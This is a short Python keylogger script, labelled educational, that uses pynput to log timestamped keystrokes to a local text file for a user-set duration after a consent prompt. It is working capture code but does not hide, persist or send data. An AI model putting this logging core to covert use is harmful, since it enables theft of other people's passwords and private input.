from pynput import keyboard
import threading
import time
from datetime import datetime
import os

# Configurable log file
log_file = "key_log.txt"
running = True

# Welcome message and explanation
def show_welcome():
    print("=" * 53)
    print("  SREERAM'S SIMPLE KEYLOGGER - EDUCATIONAL USE ONLY")
    print("=" * 53)
    print("This program will capture keyboard input for a limited duration.")
    print("Only use this on your own device or with permission.\n")
    print("Logs will be saved with timestamps in a local text file.\n")

# Get user permission
def get_user_consent():
    choice = input("Do you accept and wish to continue? (y/n): ").strip().lower()
    return choice == 'y'

# Log keystrokes with timestamps
def on_press(key):
    if running:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)  # e.g., Key.enter, Key.space

        log_entry = f"{timestamp} - {key_str}\n"
        with open(log_file, "a") as f:
            f.write(log_entry)

# Stop listener after duration
def stop_after_duration(duration, listener):
    time.sleep(duration)
    global running
    running = False
    listener.stop()

# Main program
def main():
    show_welcome()

    if not get_user_consent():
        print("Consent not given. Exiting program.")
        return

    try:
        duration = int(input("Enter duration to run keylogger (in seconds): "))
    except ValueError:
        print("Invalid input. Please enter a number.")
        return

    # Clear previous logs
    open(log_file, 'w').close()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    stopper = threading.Thread(target=stop_after_duration, args=(duration, listener))
    stopper.start()

    print(f"\nKeylogger is running for {duration} seconds...")
    print(f"Keystrokes will be saved to: {os.path.abspath(log_file)}\n")

    listener.join()
    print("Keylogger stopped.")
    print(f"The log file has been saved to: {os.path.abspath(log_file)}")

if __name__ == "__main__":
    main()
